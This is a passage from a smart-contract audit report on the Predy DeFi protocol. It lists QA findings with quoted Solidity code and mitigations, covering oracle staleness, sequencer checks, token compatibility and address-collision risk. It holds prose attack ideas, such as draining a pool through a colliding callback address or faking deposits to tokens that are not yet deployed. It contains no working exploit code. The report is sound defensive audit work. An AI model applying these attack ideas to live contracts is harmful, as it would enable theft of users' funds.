This makes the attempt at verifying insufficient and effectively leaves it potentially vulnerable to a collision attack.

More on this attack idea can be seen from these sources:

1. [EIP-3607](https://eips.ethereum.org/EIPS/eip-3607) whose rationale addresses this exact attack. The EIP is in its final state.
2. Past issues: [1](https://github.com/code-423n4/2024-04-panoptic-findings/issues?q=is%3Aissue+is%3Aopen+address+collision+during+pool+deployment+allows+for+complete+draining+of+the+pool), [2](https://github.com/sherlock-audit/2023-07-kyber-swap-judging/issues?q=is%3Aissue+is%3Aopen+Router.sol+is+vulnerable+to+address+collission) & [3](https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/59).
3. A [blog post](https://mystenlabs.com/blog/ambush-attacks-on-160bit-objectids-addresses) discussing the cost (both in money and time) of this exact attack. Which all explain how a collision could occur with the addresses and then make the protocol assume that the caller is a valid pool; which in Predy's case would then lead to them stealing out all the tokens in the pool due to this part of the callback function:

```solidity
        if (amount0 > 0) {
            ERC20(uniswapPool.token0()).safeTransfer(msg.sender, amount0);
        }
        if (amount1 > 0) {
            ERC20(uniswapPool.token1()).safeTransfer(msg.sender, amount1);
        }
```

### Impact

Submitted as QA, due to time restrictions during the audit to really dive deeper within the bug window to see how much it could affect Predy, if at all.

### Recommended Mitigation Steps

Consider validating that the pool is really deployed.

## [15] `SupplyLogic#burnBondAndTransferToken()` could revert for some tokens in the future

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/SupplyLogic.sol#L79-L91

```solidity
    function burnBondAndTransferToken(Perp.AssetPoolStatus storage _pool, uint256 _amount)
        internal
        returns (uint256 finalburntAmount, uint256 finalWithdrawalAmount)
    {
        address supplyTokenAddress = _pool.supplyTokenAddress;

        (finalburntAmount, finalWithdrawalAmount) =
            _pool.tokenStatus.removeAsset(ERC20(supplyTokenAddress).balanceOf(msg.sender), _amount);

        ISupplyToken(supplyTokenAddress).burn(msg.sender, finalburntAmount);

        ERC20(_pool.token).safeTransfer(msg.sender, finalWithdrawalAmount);
    }
```

This function is used to burn the bond and then transfer the token, we can see that to do this it also needs to query the `balanceOf()` on the supply token's address. The issue, however, is that this implementation would always revert for some tokens like Aura's stash tokens which do not implement the `balanceOf()` functionality.

### Impact

DOS to `SupplyLogic#burnBondAndTransferToken()`.

### Recommended Mitigation Steps

Consider querying the balance of on a low level.

## [16] Some locks would be un-initializable due to direct `balanceOf()` call

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/types/GlobalData.sol#L35-L45

```solidity
    function initializeLock(GlobalDataLibrary.GlobalData storage globalData, uint256 pairId) internal {
        if (globalData.lockData.locker != address(0)) {
            revert IPredyPool.LockedBy(globalData.lockData.locker);
        }

        globalData.lockData.quoteReserve = ERC20(globalData.pairs[pairId].quotePool.token).balanceOf(address(this));
        globalData.lockData.baseReserve = ERC20(globalData.pairs[pairId].basePool.token).balanceOf(address(this));
        globalData.lockData.locker = msg.sender;
        globalData.lockData.pairId = pairId;
    }
```

This function is used to initialize a lock. The problem, however, is that this function directly queries the `balanceOf()` function which would then cause the attempt to fail for tokens that don't quite support this.

### Impact

Inability to initialize these locks.

### Recommended Mitigation Steps

Consider querying the `balanceOf()` on a low level instead.

## [17] Deployment of new supply tokens would fail for some tokens

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/AddPairLogic.sol#L192-L203

```solidity
    function deploySupplyToken(address _tokenAddress) internal returns (address) {
        IERC20Metadata erc20 = IERC20Metadata(_tokenAddress);

        return address(
            new SupplyToken(
                address(this),
                string.concat("Predy6-Supply-", erc20.name()),
                string.concat("p", erc20.symbol()),
                erc20.decimals()
            )
        );
    }
```

This function is used to deploy new supply tokens; however, it would always fail for some to be integrated tokens, considering not all ERC2o support the `.name()` or `.symbol()` function; which would then essentially mean a permanent DOS to the creating of these new supply tokens.

### Impact

Permanent DOS to the of creating these new supply tokens.

### Recommended Mitigation Steps

Consider using a try/catch and a default fallback symbol/name when the token doesn't support it.

## [18] Solmate's `SafeTransferLib` shouldn't be used as it doesn't check for account existence

Protocol heavily uses Solmate's `SafeTransferLib` across in-scope contracts, this can easily be confirmed by using [this search command](https://github.com/search?q=repo%3Acode-423n4%2F2024-05-predy+import+%7BSafeTransferLib%7D+from+%22%40solmate%2Fsrc%2Futils%2FSafeTransferLib.sol%22%3B+language%3A%22Gerber+Image%22&type=code&l=Gerber+Image).

Now, there is a subtle difference between the implementation of solady (solmate’s) SafeTransferLib and OZ’s SafeERC20:
- OZ’s SafeERC20 checks if the token is a contract or not.
- solady’s SafeTransferLib does not. (it's based on solmate safetransferlib)
See [here](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L10).

Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.
As a result, when the token’s address has no code, the transaction will just succeed with no error.
This attack vector was made well-known by the [qBridge hack back in Jan 2022](https://www.halborn.com/blog/post/explained-the-qubit-hack-january-2022).

It’s becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.

A sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to create fake deposits. For example: 1INCH is using the same token address for both Ethereum and BSC; Gelato's `$GEL` token is using the same token address for Ethereum, Fantom and Polygon. Also, attacker can frontrun one new token deployment and create fake deposits before it hit the chain, so this attack vector can be exploited via deposits.

### Impact

QA, considering there is a list of whitelisted tokens; however, this should be considered if more tokens are ever going to be integrated.

### Recommended Mitigation Steps

Verify if the token has code before integrating.

## [19] Setters don't have equality checkers

Multiple instances across in-scope contracts, for example: [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L91-L103).

```solidity

    /**
     * @notice Sets new operator
     * @dev Only operator can call this function.
     * @param newOperator The address of new operator
     */
    function setOperator(address newOperator) external onlyOperator {
        require(newOperator != address(0));
        operator = newOperator;

        emit OperatorUpdated(newOperator);
    }
```

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L286-L292

```solidity
    function updateRecepient(uint256 vaultId, address recipient) external onlyVaultOwner(vaultId) {
        DataType.Vault storage vault = globalData.vaults[vaultId];

        vault.recipient = recipient;

        emit RecepientUpdated(vaultId, recipient);
    }
```

### Impact

Bad code, unnecessary execution.

### Recommended Mitigation Steps

Consider checking if the value to be stored is in the already stored value and if yes, skip re-storing it

## [20] Oracle price updates could be front run to game the system

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L44-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();

        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this price data ends up being used in core areas accross protocol. The issue explained in this report is the fact that the price used is gotten from Chainlink; however, there are no protections on popular bug cases like an attacker frontrunning the price update from Chainlink to gain the most from the system. More on how this bug can be of an affect to the protocol can be seen from:

- Past finding: https://github.com/code-423n4/2024-04-dyad-findings/issues/1205
- A blog on how this works [here](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#f123).

### Impact

Seems to be QA at most, considering deployment is being done on optimistic L2s.

### Recommended Mitigation Steps

Consider applying fees to logics that directly use the price returned from here. This way, we can always ensure minimal arbitrage is done away with since the profits might be engulfed by the fees.

## [21] Make `PredyPool#withdrawCreatorRevenue()` more effective

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L199-L213

```solidity
    function withdrawCreatorRevenue(uint256 pairId, bool isQuoteToken) external onlyPoolOwner(pairId) {
        Perp.AssetPoolStatus storage pool = _getAssetStatusPool(pairId, isQuoteToken);

        uint256 amount = pool.accumulatedCreatorRevenue;

        require(amount > 0, "AZ");

        pool.accumulatedCreatorRevenue = 0;

        if (amount > 0) {
            ERC20(pool.token).safeTransfer(msg.sender, amount);
        }

        emit CreatorRevenueWithdrawn(pairId, isQuoteToken, amount);
    }
```

This function is used to withdraw the accumulated creator revenue.
and only the pool owner is expected to have access to this function. The problem, however, is that this function erroneously checks that amount is `> 0` twice.

### Impact

Bade code writing, hints potential error in code.

### Recommended Mitigation Steps

Change to considering the first requirement already ensured the amount `!= 0`

```diff
    function withdrawCreatorRevenue(uint256 pairId, bool isQuoteToken) external onlyPoolOwner(pairId) {
        Perp.AssetPoolStatus storage pool = _getAssetStatusPool(pairId, isQuoteToken);

        uint256 amount = pool.accumulatedCreatorRevenue;

        require(amount > 0, "AZ");

        pool.accumulatedCreatorRevenue = 0;

-        if (amount > 0) {
            ERC20(pool.token).safeTransfer(msg.sender, amount);
-        }

        emit CreatorRevenueWithdrawn(pairId, isQuoteToken, amount);
    }
```

## [22] `UniswapSettlement#swapExactIn()` should be made safer

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/settlements/UniswapSettlement.sol#L22-L37

```solidity
    function swapExactIn(
        address,
        address baseToken,
        bytes memory data,
        uint256 amountIn,
        uint256 amountOutMinimum,
        address recipient
    ) external override returns (uint256 amountOut) {
        ERC20(baseToken).safeTransferFrom(msg.sender, address(this), amountIn);
        ERC20(baseToken).approve(address(_swapRouter), amountIn);

        amountOut = _swapRouter.exactInput(
            ISwapRouter.ExactInputParams(data, recipient, block.timestamp, amountIn, amountOutMinimum)
        );
    }
```

Multiple issues with how the approval is being done here:

1. It doesn't check the return value to ensure the approval was successful.
2. Protocol uses native `ERC20.approve()` function whose definition has a boolean return value: `function approve(address spender, uint256 amount) public virtual returns (bool)`. This then means that in the case where this is an interface and the integrated token; for example, `USDT`, whose approval definition doesn't have this bool return value, i.e., `function approve(address spender, uint256 amount) public virtual {`, then attempting to approve on `USDT` would always fail considering the compiler would revert when it's expecting a return value and doesn't receive one.

### Impact

Bad integration, potential incompatibility with tokens, causing a DOS to swaps.

### Recommended Mitigation Steps

Consider using the safer option of `approve()`.

## [23] `PriceFeed#getSqrtPrice()` query to `latestRoundData()` is done in a wrong way since there is no check first to see if the sequencer is down

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData(); //@audit
        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this data is queried when [checking if the vault is in danger](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L129) in order to liquidate it, with needing a confirmation via `PositionCalculator.isLiquidatable()`.

The problem is that unlike the way Pyth is being queried which includes a `VALID_TIME_PERIOD` to act as a stale check for Pyth's `getPriceNoOlderThan()`. In the case of Chainlink, the protocol just ingests whatever price is returned from the feed even though it might be stale/not safe.

One thing with using Chainlink on L2 chains is that there is a need to check if the sequencer is down to avoid prices from looking like they are fresh although they are not. The bug could then be leveraged by malicious actors to take advantage of the sequencer downtime.

### Impact

Core functionalities across protocol would be somewhat broken on L2 chains where the networks could be down for a while.

As this, in it's sense, is like a `pausing` functionality on the chain and any action that's time-restricted has a potential of been flawly finalized, popular bug ideas include users not being able say add collateral if they had borrowed a position making them immediately liquidatable when the sequencer comes back on, etc. This could be coined to fit into any time-restricted logic.

If the sequencer goes down, the protocol will allow users to continue to operate at the previous (stale) prices.

### Recommended Mitigation Steps

Consider reimplementing the timing logics on the L2 side of the protocol to take the fact that the sequencer could indeed be down into account.

Additionally, since Chainlink recommends that all Optimistic L2 oracles consult the Sequencer Uptime Feed to ensure that the sequencer is live before trusting the data returned by the oracle introduce a seqeuncer check to ensure that the sequencer is active and prices returned are accurate.

## [24] `PriceFeed#getSqrtPrice()` might be broken in the future due to it's integration with Pyth's `expo` value

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();
    //@audit
        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this data is queried when [checking if the vault is in danger](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L129) in order to liquidate it, with needing a confirmation via `PositionCalculator.isLiquidatable()`. Extensively, it also is used for all other pricing logics; now it includes an expo, check with has the value of the expo be `== - 8`.

However, going to the implementation of Pyth natively, i.e., the Pyth Client, we can see that the actual exp value can indeed be negative and positive:

- [add_price.rs#L44](https://github.com/pyth-network/pyth-client/blob/main/program/rust/src/processor/add_price.rs#L44): When you add a price, it checks the exponent.
    - [utils.rs#L101-L106](https://github.com/pyth-network/pyth-client/blob/main/program/rust/src/utils.rs#L101-L106): It can be between `+-MAX_NUM_DECIMALS`.
    - [c_oracle_header.rs#L14](https://github.com/pyth-network/pyth-client/blob/main/program/rust/src/c_oracle_header.rs#L14): The `MAX_NUM_DECIMALS` has a value of 12, so theoretically, it can be `+-12`.

Furthermore, based on a Spearbit discussion with the Pyth team on a previous audit, _(see 5.2.2 from [this report](https://github.com/euler-xyz/euler-price-oracle/blob/c4074ab7a7aa0c6ffbc555391d9f0bfe1ee5fd6f/audits/Euler_Price_Oracle_Spearbit_Report_DRAFT.pdf))_ the Pyth team have confirmed that currently they have set [the `expo` must be `-ve` check in the SDK](https://github.com/pyth-network/pyth-crosschain/blob/a888ba318c0325c29070eaf5afcc3a4d443b058c/target_chains/ethereum/sdk/solidity/PythUtils.sol#L18) to facilitate the discussions, but they do not exclude the fact that this value can be positive in the future.

### Impact

QA, considering this affects future code; however, this means that valid prices would not be ingested.

### Recommendation

Consider supporting positive `8` exp value also for a more generalized integration of the PythOracle.

## [25] Protocol uses two different price source when querying prices which is riskier than using one sure source or having the second confirmed source as a fallback

[`PriceFeed#getSqrtPrice()`](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58)

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();  //@audit
        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this data is queried when [checking if the vault is in danger](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L129) in order to liquidate it, with needing a confirmation via `PositionCalculator.isLiquidatable()`. The problem is that the current logic is unsafe, considering a failure from one of the supported oracle sources, causes the whole attempt to revert.

Understandably, one can assume protocol is implementing two sources to ensure an attacker manipulating one source would not easily manipulate the other, but this leaves the execution vulnerable to the bug case where if one of the sources fail, the whole attempt fails.

### Impact

Protocol seems to wrongly integrate multiple oracles, cause currently if one of the oracles bubble up an error the whole attempt at pricing the tokens fail, whereas generally adopted logic would be to query one source and if it fails, query the other, which ensures the failure would occur 50% less than what's been implemented now.

### Recommended Mitigation Steps

Consider correctly integrating multiple oracles attempt to query both prices from one source, if it fails then query the other source for both prices, or leave this implementation but have it in a try/catch and if any attempt fails, then query another source.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
